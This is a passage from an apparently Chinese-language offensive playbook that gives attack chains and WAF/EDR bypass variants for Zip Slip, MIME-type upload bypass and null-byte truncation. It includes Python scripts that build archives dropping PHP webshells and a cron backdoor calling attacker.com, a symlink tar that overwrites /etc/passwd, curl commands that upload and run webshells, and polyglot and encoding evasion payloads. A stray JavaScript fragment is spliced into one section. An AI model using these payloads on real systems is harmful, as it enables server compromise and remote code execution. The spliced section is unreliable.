..\..\..\WINDOW~1\system32\drivers\etc\hosts

# 超长路径截断（PHP < 5.3）
../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

# 点空格点截断（Windows）
../../windows/win.ini. . .
```

---

### Zip Slip  `file-zip-slip`
利用恶意构造的压缩包文件(ZIP/TAR)中的路径遍历实现任意文件写入，覆盖服务器上的关键文件或写入Webshell
子类：**Zip** · tags: `zip-slip` `file` `rce`

**前置条件：** 目标存在ZIP/TAR文件上传并自动解压功能；解压库未对文件名中的路径遍历进行过滤；了解Web根目录或其他关键目录的路径

**攻击链：**

**1. 探测ZIP上传和解压功能**  _[linux]_
_识别目标的ZIP上传解压功能和文件存储路径_
```
# 常见的ZIP上传解压场景:
# - 批量文件上传(模板/资源导入)
# - 插件/主题安装(WordPress/Discuz)
# - 备份恢复功能
# - 文档处理(DOCX/XLSX本质是ZIP)

# 测试正常ZIP上传:
echo "test" > test.txt
zip test.zip test.txt
curl -F "file=@test.zip" "http://target.com/upload/batch"

# 确认解压后文件的存储路径:
curl "http://target.com/uploads/test.txt"
```

**2. 构造Zip Slip恶意压缩包**
_使用Python创建包含路径遍历文件名的恶意ZIP压缩包_
```
# Python脚本创建恶意ZIP:
import zipfile
import os

# 目标：写入webshell到web根目录
with zipfile.ZipFile("evil.zip", "w") as zf:
    # 正常文件(伪装)
    zf.writestr("readme.txt", "Normal file")
    # 恶意文件(路径遍历)
    zf.writestr("../../../var/www/html/test_shell.php",
                "<?php echo system($_GET['cmd']); ?>")
    # 或覆盖配置文件:
    zf.writestr("../../../../../../etc/cron.d/backdoor",
                "* * * * * root curl http://attacker.com/callback")

print("[+] evil.zip created")
print("Files in ZIP:")
with zipfile.ZipFile("evil.zip", "r") as zf:
    for info in zf.infolist():
        print(f"  {info.filename} ({info.file_size} bytes)")
```

**3. 上传并验证Zip Slip**  _[linux]_
_上传恶意ZIP并验证是否成功写入Webshell_
```
# 上传恶意ZIP
curl -F "file=@evil.zip" "http://target.com/upload/batch"

# 验证webshell写入成功
curl "http://target.com/test_shell.php?cmd=id"
curl "http://target.com/test_shell.php?cmd=whoami"

# 如果目标是Java应用(WAR包):
# 构造恶意WAR/JAR包(本质也是ZIP):
jar cf evil.war -C webshell/ .
# 或修改文件名为../../../webapps/ROOT/shell.jsp
```

**4. TAR包Zip Slip变体**
_使用TAR包实现Zip Slip，包括符号链接攻击变体_
```
# 构造恶意TAR包:
import tarfile
import io

with tarfile.open("evil.tar.gz", "w:gz") as tar:
    # 添加恶意文件
    content = b"<?php system($_GET['cmd']); ?>"
    info = tarfile.TarInfo(name="../../../var/www/html/test_t.php")
    info.size = len(content)
    tar.addfile(info, io.BytesIO(content))

# 使用符号链接攻击:
import tarfile
with tarfile.open("evil_symlink.tar.gz", "w:gz") as tar:
    # 创建指向/etc/passwd的符号链接
    info = tarfile.TarInfo(name="link_to_passwd")
    info.type = tarfile.SYMTYPE
    info.linkname = "/etc/passwd"
    tar.addfile(info)
    # 然后通过"link_to_passwd"覆盖目标文件
    content = b"root:x:0:0:root:/root:/bin/bash"
    info2 = tarfile.TarInfo(name="link_to_passwd")
    info2.size = len(content)
    tar.addfile(info2, io.BytesIO(content))
```

**WAF/EDR 绕过变体：**

**1. 替代压缩格式绕过**
_使用tar/7z/cpio等替代压缩格式，WAF可能仅检测zip格式的路径遍历_
```
# 使用tar格式（可能未被检测）
import tarfile, io
with tarfile.open('test.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='../../../tmp/test.txt')
    info.size = 14
    tar.addfile(info, io.BytesIO(b'security_check'))

# 使用7z格式
7z a test.7z ../../../tmp/test.txt

# 使用cpio格式
echo "../../../tmp/test.txt" | cpio -o > test.cpio
```

**2. 符号链接攻击**
_压缩包内嵌入符号链接指向敏感文件，解压后通过符号链接读取目标文件_
```
# 创建包含符号链接的压缩包
import zipfile, os

# 方法1: tar符号链接
import tarfile
with tarfile.open('symlink.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='link')
    info.type = tarfile.SYMTYPE
    info.linkname = '/etc/passwd'
    tar.addfile(info)

# 方法2: zip中嵌入符号链接（Linux）
os.symlink('/etc/passwd', '/tmp/link')
with zipfile.ZipFile('symlink.zip', 'w') as zf:
    zf.write('/tmp/link', 'link')
```

**3. 文件名编码混淆**
_通过修改压缩包内文件名的编码方式（UTF-8/GBK/反斜杠）绕过解压时的路径检查_
```
# Unicode文件名混淆
import zipfile, io, struct

with zipfile.ZipFile('encoded.zip', 'w') as zf:
    # 使用反斜杠（Windows路径分隔符）
    zf.writestr('..\\..\\..\\tmp\\test.txt', 'security_check')

# 手工构造zip（修改中央目录文件名）
# 使用UTF-8编码的路径遍历字符
with open('crafted.zip', 'rb') as f:
    data = bytearray(f.read())
    # 替换文件名中的编码字符
    # ../变为 %2e%2e%2f 的原始字节
```

---

### MIME类型绕过  `file-mime`
通过伪造MIME类型(Content-Type)绕过文件上传的类型检查，上传恶意可执行文件
子类：**MIME** · tags: `mime` `bypass`

**前置条件：** 目标存在文件上传功能；服务端仅通过Content-Type判断文件类型；了解目标允许的MIME类型

**攻击链：**

**1. 探测文件类型检查机制**  _[linux]_
_通过对比测试判断服务端使用的文件类型验证方式_
```
# 测试不同的上传方式判断检查点:

# 1. 正常上传(应该成功):
curl -F "file=@test.jpg;type=image/jpeg" "http://target.com/upload"

# 2. 修改Content-Type(判断是否仅检查MIME):
curl -F "file=@shell.php;type=image/jpeg" "http://target.com/upload"

# 3. 修改扩展名(判断是否检查扩展名):
curl -F "file=@shell.jpg;type=application/x-php" "http://target.com/upload"

# 4. 仅修改文件头(判断是否检查Magic Bytes):
# GIF89a开头的PHP:
printf "GIF89a<?php system($_GET['cmd']); ?>" > shell.gif
curl -F "file=@shell.gif;type=image/gif" "http://target.com/upload"
```

**2. MIME类型伪造上传Webshell**  _[linux]_
_使用MIME伪造结合各种文件名技巧上传可执行文件_
```
# 将PHP webshell的Content-Type伪造为图片:
curl -X POST "http://target.com/upload"   -F "file=@shell.php;type=image/jpeg;filename=shell.php"

# 如果服务端同时检查扩展名，使用双扩展名:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.jpg" "http://target.com/upload"
curl -F "file=@shell.php;type=image/png;filename=shell.jpg.php" "http://target.com/upload"

# Apache多扩展名解析:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.abc" "http://target.com/upload"

# Nginx解析漏洞:
curl -F "file=@shell.jpg;type=image/jpeg" "http://target.com/upload"
curl "http://target.com/uploads/shell.jpg/.php"
```

**3. Magic Bytes伪造**  _[linux]_
_在恶意文件前面添加合法的Magic Bytes文件头绕过内容检查_
```
# 在PHP文件前添加各种文件头:

# JPEG文件头:
printf "ÿØÿà\x00JFIF" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# PNG文件头:
printf "PNG

" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# GIF文件头:
printf "GIF89a" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# BMP文件头:
printf "BM" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# 上传:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php" "http://target.com/upload"
```

**4. 验证上传结果**
_确认上传文件路径并验证Webshell可执行_
```
# 确认文件上传路径:
curl -v "http://target.com/uploads/shell.php"

# 执行命令:
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"

# 如果无法直接访问，尝试其他路径:
curl "http://target.com/upload/files/shell.php?cmd=id"
curl "http://target.com/static/uploads/shell.php?cmd=id"
curl "http://target.com/resources/shell.php?cmd=id"
```

**WAF/EDR 绕过变体：**

**1. Polyglot文件绕过**
_创建同时满足图片格式魔术字节和PHP解析的Polyglot文件，绕过文件类型检测_
```
# GIF+PHP Polyglot
GIF89a<?php echo "security_check"; ?>

# PNG+PHP Polyglot（使用exiftool注入）
exiftool -Comment='<?php echo "security_check"; ?>' test.png
mv test.png test.php.png

# JPEG Polyglot
exiftool -DocumentName='<?php echo "security_check"; ?>' test.jpg

# BMP+PHP
python3 -c "import struct; open('poly.php.bmp','wb').write(b'BM'+struct.pack('<I',54)+b'\x00'*46+b'<?php echo \"security_check\"; ?>')"
```

**2. Content-Type边界操控**
_利用多重Content-Type头、boundary混淆和MIME大小写差异绕过WAF文件类型检查_
```
# 多个Content-Type头
POST /upload HTTP/1.1
Content-Type: image/jpeg
Content-Type: application/x-php

# boundary混淆
Content-Type: multipart/form-data; boundary=abc; boundary=xyz

# 大小写混淆MIME类型
Content-Type: Image/JPEG
Content-Type: image/JPEG; charset=utf-8

# 添加额外参数
Content-Type: image/jpeg; name="test.php"
```

**3. EXIF元数据注入payload**
_将payload注入图片的EXIF/XMP/ICC元数据字段，配合文件包含漏洞执行代码_
```
# EXIF Comment注入
exiftool -Comment='<?php system("id"); ?>' photo.jpg

# XMP元数据注入
exiftool -XMP-dc:Description='<script>alert(1)</script>' photo.jpg

# ICC Profile注入
exiftool -ICC_Profile:ProfileDescription='<?php echo "security_check"; ?>' photo.jpg

# 上传后配合文件包含利用
# http://target/include.php?file=uploads/photo.jpg
```

---

### 空字节截断  `file-null-byte`
利用空字节(%00/\x00)截断文件名的扩展名验证，绕过文件上传白名单限制
子类：**Null Byte** · tags: `null-byte` `bypass`

**前置条件：** 目标使用白名单验证文件扩展名；后端语言或库受空字节截断影响(PHP<5.3.4, Java旧版本)；服务端在路径拼接中存在截断点

**攻击链：**

**1. 空字节截断原理与环境检测**
_检测目标环境是否可能受空字节截断影响_
```
# 空字节截断受影响的环境:
# - PHP < 5.3.4 (底层C函数将\x00视为字符串结尾),
        syntaxBreakdown: [
          { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
          { part: 'alert()', explanation: { zh: '弹窗函数', en: 'Alert function' }, type: 'function' }
        ]
# - Java旧版本的File类
# - 部分Python 2.x版本
# - 使用C/C++扩展的程序

# 检测PHP版本:
curl -sI "http://target.com/" | grep -i "x-powered-by|server"
curl -s "http://target.com/phpinfo.php" | grep -i "php version"
```

**2. 文件上传空字节截断**
_在文件名中注入空字节截断扩展名验证_
```
# 方法1: URL编码空字节:
curl -F "file=@shell.php;filename=shell.php%00.jpg" "http://target.com/upload"

# 方法2: 在Burp中修改原始字节:
# 将文件名 shell.php[0x00].jpg 中的[0x00]替换为实际的空字节
# Burp Repeater → 选中%00 → 右键 → Convert → URL decode

# 方法3: Python发送:
import requests
files = {"file": ("shell.php\x00.jpg", open("shell.php","rb"), "image/jpeg")}
r = requests.post("http://target.com/upload", files=files)
print(r.status_code, r.text[:200])
```

**3. 文件包含空字节截断**  _[linux]_
_在文件包含场景中利用空字节截断服务端拼接的后缀_
```
# PHP文件包含中的空字节截断:
# 服务端代码: include($_GET["page"] . ".php");

# 正常请求:
curl "http://target.com/index.php?page=about"   # → include("about.php")

# 空字节截断:
curl "http://target.com/index.php?page=../../../etc/passwd%00"
# → include("../../../etc/passwd\x00.php")
# → 实际读取 ../../../etc/passwd (\x00截断了.php)

# 配合路径遍历:
curl "http://target.com/index.php?page=../../../var/log/apache2/access.log%00"
curl "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config%00"
```

**4. 现代替代方案(PHP>=5.3.4)**
_在PHP 5.3.4+无法使用空字节截断时的替代绕过方案_
```
# PHP 5.3.4+已修复空字节截断，替代方案:

# 1. 路径截断(超长路径):
# Windows MAX_PATH=260, Linux PATH_MAX=4096
payload="shell.php" + "/./" * 2048 + ".jpg"
curl "http://target.com/upload" -F "file=@shell.php;filename=$payload"

# 2. 点号截断(Windows):
# Windows忽略文件名末尾的点号和空格
curl -F "file=@shell.php;filename=shell.php." "http://target.com/upload"
curl -F "file=@shell.php;filename=shell.php " "http://target.com/upload"
curl -F "file=@shell.php;filename=shell.php::$DATA" "http://target.com/upload"

# 3. 大小写绕过:
curl -F "file=@shell.pHP;type=image/jpeg" "http://target.com/upload"
```

**WAF/EDR 绕过变体：**

**1. 路径长度截断**
_利用文件系统路径最大长度限制，超长路径导致后缀被截断_
```
# PHP路径长度截断（PHP < 5.3, 超过4096字符）
../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.

# 超长扩展名截断
test.php.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# 点号截断（Windows MAX_PATH=260）
test.php...........................................................................
```

**2. Windows特殊文件名技巧**
_利用Windows NTFS文件系统特性（ADS流/短文件名/特殊字符处理）绕过扩展名检测_
```
# 点空格点截断（Windows NTFS）
test.php. . . .
test.php::$DATA
test.php::$DATA.jpg

# ADS流隐藏扩展名
test.php::$INDEX_ALLOCATION
test.asp;.jpg
test.asp%00.jpg

# Windows短文件名（8.3格式）
TESTPH~1.PHP
SHELL~1.PHP
```

**3. 替代空字节表示**
_使用不同编码方式表示空字节或终止符，绕过WAF对%00的检测规则_
```
# 不同编码的空字节
test.php%00.jpg
test.php\x00.jpg
test.php\0.jpg
test.php\u0000.jpg

# URL编码变体
test.php%2500.jpg   # 双重编码空字节
test.php%u0000.jpg  # UTF-16空字节

# 特殊终止符
test.php%0d.jpg     # 回车符
test.php%0a.jpg     # 换行符
test.php%1a.jpg     # EOF标记
```

---
